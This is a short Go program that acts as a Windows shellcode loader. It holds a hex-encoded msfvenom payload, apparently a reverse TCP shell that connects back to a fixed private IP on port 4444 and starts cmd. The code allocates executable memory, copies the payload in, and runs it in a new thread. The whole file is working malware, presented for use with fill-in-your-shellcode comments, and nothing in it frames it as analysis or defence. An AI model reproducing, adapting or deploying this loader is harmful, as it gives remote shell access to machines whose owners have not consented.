package main

import (
	"encoding/hex"
	"log"
	"syscall"
	"unsafe"
)

func main() {
	// 1. Paste your hex-encoded msfvenom shellcode here
	shellcodeHex := "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc0200115cc0a8019741544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd550504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd54881c44002000049b8636d640000000000415041504889e25757574d31c06a0d594150e2fc66c74424540101488d442418c600684889e6565041504150415049ffc0415049ffc84d89c14c89c141ba79cc3f86ffd54831d248ffca8b0e41ba08871d60ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5" // Replace with your actual hex string

	// 2. Decode the hex string into a byte slice
	shellcode, err := hex.DecodeString(shellcodeHex)
	if err != nil {
		log.Fatalf("Failed to decode hex string: %v", err)
	}

	// 3. Load kernel32.dll and get the required Windows API functions
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	CreateThread := kernel32.NewProc("CreateThread")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")

	// 4. Allocate Read/Write/Execute (0x40) memory for the shellcode
	// MEM_COMMIT = 0x1000, MEM_RESERVE = 0x2000
	addr, _, errVirtualAlloc := VirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		0x1000|0x2000,
		0x40,
	)
	if addr == 0 {
		log.Fatalf("VirtualAlloc failed: %v", errVirtualAlloc)
	}

	// 5. Copy the shellcode into the allocated memory space
	// We use a Go slice-to-pointer conversion to manually copy the bytes
	src := (*[1 << 30]byte)(unsafe.Pointer(&shellcode[0]))[:len(shellcode):len(shellcode)]
	dst := (*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode):len(shellcode)]
	copy(dst, src)

	// 6. Create a thread pointing to our shellcode execution address
	thread, _, errCreateThread := CreateThread.Call(
		0,
		0,
		addr,
		0,
		0,
		0,
	)
	if thread == 0 {
		log.Fatalf("CreateThread failed: %v", errCreateThread)
	}

	// 7. Wait indefinitely for the thread to finish (keeping our shell alive)
	// INFINITE = 0xFFFFFFFF
	_, _, _ = WaitForSingleObject.Call(thread, 0xFFFFFFFF)
}
